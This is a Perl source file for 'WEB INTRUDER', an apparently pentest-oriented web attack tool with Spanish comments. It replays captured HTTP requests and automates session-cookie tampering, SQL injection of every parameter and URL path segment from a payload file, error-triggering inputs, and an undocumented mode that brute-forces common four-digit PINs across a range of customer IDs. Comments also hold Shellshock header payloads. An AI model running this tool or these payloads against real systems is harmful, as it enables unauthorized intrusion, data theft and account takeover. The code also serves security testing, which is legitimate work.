#!/usr/bin/perl
use Data::Dumper;
use XML::Simple;
use Time::localtime;
use Getopt::Std;
use Term::ANSIColor qw(:constants);
use MIME::Base64 qw( decode_base64 );
use webintruder;
no warnings;

my $banner = <<EOF;
                                                        
WEB INTRUDER                                                                                                                      

Autor: Daniel Torres Sandi
EOF



$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0; 
my $t = localtime;
my $today = sprintf("%04d-%02d-%02d",$t->year + 1900, $t->mon + 1, $t->mday);

my $debug =0; 

print $banner;  
sub usage
{
  printf "Uso :\n";  
  printf "webintruder.pl -f file.xml -t {session/sqli/error}  -c cookie \n\n";
  printf "webintruder.pl -f file.xml -t session -c \"PHPSESSION=hfs77fhsuf7\" \n";
  printf "webintruder.pl -f file.xml -t session -c \"PHPSESSION=0\" \n";
  printf "webintruder.pl -f file.xml -t session -c nocookie \n";
  printf "webintruder.pl -f file.xml -t sqli \n";
  printf "webintruder.pl -f file.xml -t error \n";
  
  exit(1);
}

getopts('f:t:c:h:', \%opts);

my $file = $opts{'f'} if $opts{'f'};
my $test = $opts{'t'} if $opts{'t'};
my $cookie = $opts{'c'} if $opts{'c'};

my @file_array = split(".",$file);
my $section=@file_array[0];



# Print help message if required
if ($opts{'h'} || !(%opts)) {
	usage();
	exit 0;
}  

system("mkdir -p .log/$section/$test 2>/dev/null ");

if ($test eq "session")
	{$title = "COOKIE";}
else	
	{$title = "PARAMETROS";}

open (SALIDA,">$section-$test.csv") || die "ERROR: No puedo abrir el fichero $test.csv\n";
print SALIDA "ID;URL;METHOD;$title;ORIGINAL STATUS;CURRENT STATUS;STATUS MATCH;ERROR IN RESPONSE;RESPONSE LENGHT\n";
close (SALIDA);	
		
################### Load accounts ####################
my $xml = new XML::Simple;

# read accounts XML file
$request_xml = $xml->XMLin($file);
$request_number = @{$request_xml->{item}}; 
print BLUE,"[i] Testing $test in section $section \n\n ", RESET;     
if($test eq "session")
	{print BLUE,"[i] Testing with cookie = $cookie \n\n ", RESET;}

print YELLOW,"[i] We have $request_number request \n ", RESET;    

######################################################

my $webintruder = webintruder->new(	debug => $debug, 
					proxy_host => '',
					proxy_port => '',
					proxy_user => '',
					proxy_pass => '');
					
my $req_id=0;

for (my $i=0; $i<$request_number;$i++)
{
     
   my $url = $request_xml->{item}->[$i]->{url};  
   my $method = $request_xml->{item}->[$i]->{method};      
   my $original_status = $request_xml->{item}->[$i]->{status};  
   my $original_response64 = $request_xml->{item}->[$i]->{response}->{content};   
   my $request = decode_base64($request_xml->{item}->[$i]->{request}->{content});
   
   
   
   my $new_request_parameters;
   print YELLOW,"\t[+] Request $i ($url): method $method  \n ", RESET;  
       
   
   my $current_headers = $webintruder->headers;
   #print "request $request \n";   
   
  my @headers_array = split("\r\n\r\n",$request);
    
  $headers = @headers_array[0];
  $request_parameters = @headers_array[1];
  
  #print	"HEADERS $headers \n"; 
  print	"request_parameters $request_parameters \n" if ($debug); 
   
   ########## procesar los headers ##########
   my @headers_array2 = split("\n",$headers);
   foreach (@headers_array2)
   {
	  if (! ($_ =~ /POST|GET|Host|Content-Length|Connection/m)){	 
		  
		   my @array = split(": ",$_);
		   my $header_name = @array[0];
		   my $header_value = @array[1];		  
		   $header_value =~ s/\n//g; 
		   $header_name =~ s/\n//g; 
		   $header_value =~ s/\r//g; 
		   
		   
		   if ($test eq "session" || $cookie ne "")
		   {		   
			
				if ($header_name eq "Cookie")
				{ 
					if ($cookie ne "nocookie")
						{$current_headers->header($header_name => $cookie);}
				}
				else
					{$current_headers->header($header_name => $header_value);}		   
		   }
		   else		   		  
		   {		   
			   $current_headers->header($header_name => $header_value);
		   }   
		}	 	 
   }
   ##############################
   
   if ($method eq "GET")  
   {
	   	my @url_array = split('\?',$url);
		$request_parameters = @url_array [1];
		$url = @url_array [0];
			
   }
	   ################ acceder a todas las variables POST/GET #####################
	   
	   
	    my %name_value_array;	     
	     my @parameters_array = split('&',$request_parameters);
	     foreach my $param (@parameters_array)
	     {						
			my @param_array = split('=',$param);
			my $param_name = @param_array[0];
			my $param_value = @param_array[1];		
			push @name_value_array, { $param_name => $param_value};
		 }
		 		
		
				
		###########################
	   
	   
	   if ($test eq "session")
	   {
		   		   
		   $webintruder->request(url =>$url, method => $method, headers=> $current_headers, original_status => $original_status, original_response64 => $original_response64, test => $test, section => $section, request_parameters => $final_request_parameters,req_id => $req_id, cookie => $cookie);
		   $req_id++;
	   }
	   
	   if ($test eq "sqli")
	   {
		 
		 if ($method eq "GET" && $request_parameters eq "") # la variable esta al finalizar la url https://dominio.com.bo/Usuarios/Usuario/12
		 {				
				my $url_inject = "";
				my @url_array = split('/',$url);
				$len = $#url_array;

				for (my $i=0;$i<=$len; $i++)
				{
					if ($i ne $len)
						{$url_inject .= @url_array[$i]."/";}
					else
						{$url_inject .= "INJECT";}
				}
				
				######### send 	request https://dominio.com.bo/Usuarios/Usuario/'INJECT
				open (MYINPUT,"</usr/share/webintruder/payloads/sqli.txt") || die "ERROR: Can not open the file /usr/share/webintruder/payloads/sqli.txt\n";						
				while ($inject=<MYINPUT>)
				{ 
					$inject =~ s/\n//g; 
					$final_url = $url_inject; 
					$final_url =~ s/INJECT/$inject/g; 					
					print "final_url $final_url \n" if ($debug);
					$pwned = $webintruder->request(url => $final_url, method => $method, headers=> $current_headers, original_status => $original_status, original_response64 => $original_response64, test => $test, section => $section, request_parameters => $final_request_parameters,req_id => $req_id);
					$req_id++;										
					if ($pwned)
						{print RED,"\t[+] Pwned  !! \n ", RESET;  last;}			
						
				}
				close MYINPUT;
				#################################################
		 }
		   			  
	    
			
			    ########## send Injection in all parameters ###############
			    
			    foreach my $hash_ref (@name_value_array) {					
					foreach my $param1 (keys %{$hash_ref}) {								
						$new_request_parameters = "$param1=INJECT&";				
						foreach my $hash_ref2 (@name_value_array) {					
							foreach my $param2 (keys %{$hash_ref2}) {
								if ($param1 ne $param2)
								{	
									my $current_value = ${$hash_ref2}{$param2};							 							 
									$new_request_parameters .= "$param2=$current_value&";							 
								}
							}										
						}
				
						open (MYINPUT,"</usr/share/webintruder/payloads/sqli.txt") || die "ERROR: Can not open the file /usr/share/webintruder/payloads/sqli.txt\n";						
						while ($inject=<MYINPUT>)
						{ 
							$inject =~ s/\n//g; 
							$final_request_parameters = $new_request_parameters; 
							$final_request_parameters =~ s/INJECT/$inject/g; 
							print "request_parameters $final_request_parameters \n" if ($debug);
							$pwned = $webintruder->request(url =>$url, method => $method, headers=> $current_headers, original_status => $original_status, original_response64 => $original_response64, test => $test, section => $section, request_parameters => $final_request_parameters,req_id => $req_id);
							$req_id++;
							print "pwned $pwned \n" if ($debug);
							if ($pwned)
								{last;}			
						
						}
						close MYINPUT;								
					}										 
				}
				undef @name_value_array;
				#####################################		  
		}
		
		
		
		if ($test eq "pin")
	    {
		 			
		my @commons_pins = ("1234","1111","0000","1212","7777","1004","2000","4444","2222","6969","9999","3333","5555","6666","1122","1313","8888","4321","2001","1010");	 	    		
			
			    ########## send Injection in all parameters ###############
			    my $current_pin;
			    for (my $ci=3023; $ci<=6000; $ci++)
			    {
					foreach my $pin (@commons_pins)
					{												
						
						$final_request_parameters = "ci=$ci&pin=$pin&";
										
						print "request_parameters $final_request_parameters \n" ;#if ($debug);						
						$pwned = $webintruder->request(url =>$url, method => $method, headers=> $current_headers, original_status => $original_status, original_response64 => $original_response64, test => $test, section => $section, request_parameters => $final_request_parameters,req_id => $req_id);
						$req_id++;
																											
						#####################################	
						
					} # for pin 
				} # for ci			    			    			    
		} # if pin
		
		
		
		
		
		
		
		if ($test eq "error")
	   {
		   			  
		#User-Agent: () { :; }; printf 'Content-Type: text/json\r\n\r\n%s vulnerable %s' 'VEGA123' 'VEGA123'
		#Referer: () { :; }; printf 'Content-Type: text/json\r\n\r\n%s vulnerable %s' 'VEGA123' 'VEGA123'
		#Accept-Language: () { :; }; printf 'Content-Type: text/json\r\n\r\n%s vulnerable %s' 'VEGA123' 'VEGA123'
		#Cookie: () { :; }; printf 'Content-Type: text/json\r\n\r\n%s vulnerable %s' 'VEGA123' 'VEGA123'
 
		 ###  get all variables from post and get requests	  
	     my %name_value_array;	     
	     my @parameters_array = split('&',$request_parameters);
	     foreach my $param (@parameters_array)
	     {						
			my @param_array = split('=',$param);
			my $param_name = @param_array[0];
			my $param_value = @param_array[1];		
			push @name_value_array, { $param_name => $param_value};
		 } 
		
		######## Send request  variable[]=fsfs
		  my $new_request_parameters;
		  foreach my $hash_ref (@name_value_array) {					
			foreach my $param1 (keys %{$hash_ref}) {								
				$new_request_parameters .= "$param1\[\]=${$hash_ref}{$param1}&";	
				}									
		  }
	
				print "request_parameters $new_request_parameters \n" if ($debug);	
				$webintruder->request(url =>$url, method => $method, headers=> $current_headers, original_status => $original_status, original_response64 => $original_response64, test => $test, section => $section, request_parameters => $new_request_parameters,req_id => $req_id, cookie => $cookie);
				$req_id++;
				print "pwned $pwned \n" if ($debug);
				if ($pwned)
					{last;}	
		 ########################
		 
		 ######### la variable esta al finalizar la url https://dominio.com.bo/Usuarios/Usuario/12
		 if ($method eq "GET" && $request_parameters eq "") 
		 {				
				my $url_inject = "";
				my @url_array = split('/',$url);
				$len = $#url_array;

				for (my $i=0;$i<=$len; $i++)
				{
					if ($i ne $len)
						{$url_inject .= @url_array[$i]."/";}
					else
						{$url_inject .= "INJECT";}
				}
				
				######### send 	request https://dominio.com.bo/Usuarios/Usuario/'INJECT
				open (MYINPUT,"</usr/share/webintruder/payloads/error.txt") || die "ERROR: Can not open the file /usr/share/webintruder/payloads/sqli.txt\n";						
				while ($inject=<MYINPUT>)
				{ 
					$inject =~ s/\n//g; 
					$final_url = $url_inject; 
					$final_url =~ s/INJECT/$inject/g; 					
					print "final_url $final_url \n" if ($debug);
					$pwned = $webintruder->request(url => $final_url, method => $method, headers=> $current_headers, original_status => $original_status, original_response64 => $original_response64, test => $test, section => $section, request_parameters => $final_request_parameters,req_id => $req_id);
					$req_id++;																			
				}
				close MYINPUT;
				#################################################
		 }
		 #########################################################
		 
		 
		 ########## send Injection in all parameters ###############
			    
		 foreach my $hash_ref (@name_value_array) {					
			foreach my $param1 (keys %{$hash_ref}) {								
				$new_request_parameters = "$param1=INJECT&";				
				foreach my $hash_ref2 (@name_value_array) {					
					foreach my $param2 (keys %{$hash_ref2}) {
						if ($param1 ne $param2)
						{	
							my $current_value = ${$hash_ref2}{$param2};							 							 
							$new_request_parameters .= "$param2=$current_value&";							 
						}
					}										
				}
		
				open (MYINPUT,"</usr/share/webintruder/payloads/error.txt") || die "ERROR: Can not open the file /usr/share/webintruder/payloads/sqli.txt\n";						
				while ($inject=<MYINPUT>)
					{ 
					$inject =~ s/\n//g; 
					$final_request_parameters = $new_request_parameters; 
					$final_request_parameters =~ s/INJECT/$inject/g; 
					print "request_parameters $final_request_parameters \n" if ($debug);
					$pwned = $webintruder->request(url =>$url, method => $method, headers=> $current_headers, original_status => $original_status, original_response64 => $original_response64, test => $test, section => $section, request_parameters => $final_request_parameters,req_id => $req_id);
					$req_id++;												
					}
					close MYINPUT;								
				}										 
			}
			undef @name_value_array;
			#####################################		 		  
		}
		
		################ ################################### #####################			    	 
	open (SALIDA,">>$section-$test.csv") || die "ERROR: No puedo abrir el fichero $test.csv\n";
	print SALIDA "\n\n";
	close (SALIDA);	
}
